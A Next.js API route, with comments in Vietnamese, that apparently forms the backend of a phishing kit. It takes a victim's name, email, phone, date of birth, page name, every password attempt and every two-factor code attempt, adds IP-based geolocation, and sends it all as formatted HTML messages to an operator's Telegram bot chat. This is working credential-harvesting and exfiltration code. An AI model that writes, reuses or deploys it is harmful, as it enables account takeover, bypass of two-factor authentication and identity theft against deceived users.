import { NextRequest, NextResponse } from "next/server";
import type { FormData, LocationData } from "@/types/form";

interface LogEventPayload {
  formDetails: FormData | null;
  passwordAttempts: string[];
  twofaAttempts: string[];
  selectedMethod?: string | null;
}

// Helper function để gửi log qua Telegram với format có thể copy
async function sendTelegramMessage(message: string, parseMode: "HTML" | "Markdown" = "HTML"): Promise<boolean> {
  try {
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log("📨 Telegram Log (no config):", message);
      return false;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: parseMode,
        disable_web_page_preview: true,
      }),
    });

    const data = await response.json();
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    return true;
  } catch (error) {
    console.error("Telegram send error:", error);
    return false;
  }
}

function formatLogMessage(payload: LogEventPayload, location: LocationData): string {
  const { formDetails, passwordAttempts, twofaAttempts, selectedMethod } = payload;

  
  // IP và Location - có thể copy
  let message = "";
  message += `<b>📍 IP:</b> <code>${location.ip}</code>\n`;
  message += `<b>🌍 Location:</b> ${location.location.country} (<code>${location.location.countryCode}</code>)\n`;
  if (location.location.city) {
    message += `<b>🏙️ City:</b> ${location.location.city}\n`;
  }
  if (location.location.region) {
    message += `<b>🗺️ Region:</b> ${location.location.region}\n`;
  }
  message += "\n";

  if (formDetails) {
    message += "<b>📋 Form Data:</b>\n";
    message += `<b>Name:</b> <code>${formDetails.fullName}</code>\n`;
    message += `<b>Email:</b> <code>${formDetails.email}</code>\n`;
    if (formDetails.emailBusiness) {
      message += `<b>Business Email:</b> <code>${formDetails.emailBusiness}</code>\n`;
    }
    message += `<b>Phone:</b> <code>${formDetails.phoneNumber}</code>\n`;
    message += `<b>DOB:</b> <code>${formDetails.day}/${formDetails.month}/${formDetails.year}</code>\n`;
    if (formDetails.pageName) {
      message += `<b>Page Name:</b> <code>${formDetails.pageName}</code>\n`;
    }
    if (formDetails.issueDescription) {
      message += `<b>Issue:</b> <code>${formDetails.issueDescription}</code>\n`;
    }
    message += "\n";
  }

  if (selectedMethod) {
    const methodNames: Record<string, string> = {
      app: "Authenticator App",
      sms: "SMS",
      email: "Email",
      whatsapp: "WhatsApp",
    };
    message += `<b>🔐 2FA Method:</b> <code>${methodNames[selectedMethod] || selectedMethod}</code>\n\n`;
  }

  // Password attempts
  if (passwordAttempts.length > 0) {
    passwordAttempts.forEach((attempt, i) => {
      message += `🔐 Password Attempt ${i + 1}: <code>${attempt}</code>\n`;
    });
  }

  // Separator between password and 2FA
  if (passwordAttempts.length > 0 && twofaAttempts.length > 0) {
    message += "---------------------------------\n";
  }

  // 2FA attempts
  if (twofaAttempts.length > 0) {
    twofaAttempts.forEach((attempt, i) => {
      message += `🔒 2FA Attempt ${i + 1}: <code>${attempt}</code>\n`;
    });
  }

  return message;
}

export async function POST(request: NextRequest) {
  try {
    const payload: LogEventPayload = await request.json();

    const headers = request.headers;
    const countryNameFromCode = (code: string | null) => {
      if (!code || code === "XX") return "";
      try {
        const dn = new Intl.DisplayNames(["en"], { type: "region" });
        return dn.of(code) || "";
      } catch {
        return "";
      }
    };

    const debugGeo = process.env.DEBUG_GEO === "1";
    const ipinfoToken = process.env.IPINFO_TOKEN;

    // Lấy IP: Cloudflare Workers dùng cf-connecting-ip
    const cfConnectingIp = headers.get("cf-connecting-ip");
    const forwarded = headers.get("x-forwarded-for");
    const realIp = headers.get("x-real-ip");
    const ip =
      (cfConnectingIp ? cfConnectingIp.trim() : "") ||
      (forwarded ? forwarded.split(",")[0].trim() : "") ||
      (realIp ? realIp.trim() : "") ||
      "unknown";

    if (debugGeo) {
      console.log("[geo-debug] headers", {
        "cf-connecting-ip": cfConnectingIp,
        "x-forwarded-for": forwarded,
        "x-real-ip": realIp,
      });
      console.log("[geo-debug] ip", { ip });
    }

    // Kiểm tra nếu IP là localhost
    const isLocalhost = 
      !ip || 
      ip === "unknown" || 
      ip === "127.0.0.1" || 
      ip === "::1" || 
      ip.startsWith("192.168.") || 
      ip.startsWith("10.") || 
      ip.startsWith("172.16.") ||
      ip.startsWith("172.17.") ||
      ip.startsWith("172.18.") ||
      ip.startsWith("172.19.") ||
      ip.startsWith("172.20.") ||
      ip.startsWith("172.21.") ||
      ip.startsWith("172.22.") ||
      ip.startsWith("172.23.") ||
      ip.startsWith("172.24.") ||
      ip.startsWith("172.25.") ||
      ip.startsWith("172.26.") ||
      ip.startsWith("172.27.") ||
      ip.startsWith("172.28.") ||
      ip.startsWith("172.29.") ||
      ip.startsWith("172.30.") ||
      ip.startsWith("172.31.");

    // Sử dụng countryCode từ form để set location mặc định
    const formCountryCode = payload.formDetails?.countryCode || "US";
    const defaultCountry = formCountryCode === "VN" ? "Vietnam" : formCountryCode === "US" ? "United States" : "United States";
    const defaultCity = formCountryCode === "VN" ? "Ho Chi Minh City" : "New York";
    const defaultRegion = formCountryCode === "VN" ? "Ho Chi Minh" : "New York";

    // Gọi API detect location để lấy thông tin chính xác
    let location: LocationData = {
      ip: isLocalhost ? "localhost" : ip,
      location: {
        country: defaultCountry,
        countryCode: formCountryCode,
        city: defaultCity,
        region: defaultRegion,
      },
    };

    // Ưu tiên IPINFO nếu có token và IP hop le
    if (!isLocalhost && ip && ip !== "unknown" && ipinfoToken) {
      try {
        const res = await fetch(`https://ipinfo.io/${ip}?token=${ipinfoToken}`);
        const data = await res.json();
        if (!data?.error && (data?.country || data?.city || data?.region)) {
          const ipinfoCountryCode = data.country || "";
          const ipinfoCountryName = countryNameFromCode(ipinfoCountryCode);
          location = {
            ip: data.ip || ip,
            location: {
              country: ipinfoCountryName || location.location.country,
              countryCode: ipinfoCountryCode || location.location.countryCode,
              city: data.city || location.location.city,
              region: data.region || location.location.region,
            },
          };
        }
      } catch (error) {
        if (debugGeo) {
          console.error("[geo-debug] ipinfo error:", error);
        }
      }
    }

    // Format và gửi log với HTML parse mode để có thể copy
    const logMessage = formatLogMessage(payload, location);
    const sent = await sendTelegramMessage(logMessage, "HTML");

    return NextResponse.json({
      success: sent,
      message: sent ? "Log sent successfully" : "Failed to send log",
    });
  } catch (error) {
    console.error("Log event error:", error);
    return NextResponse.json(
      { success: false, message: "Internal server error" },
      { status: 500 }
    );
  }
}
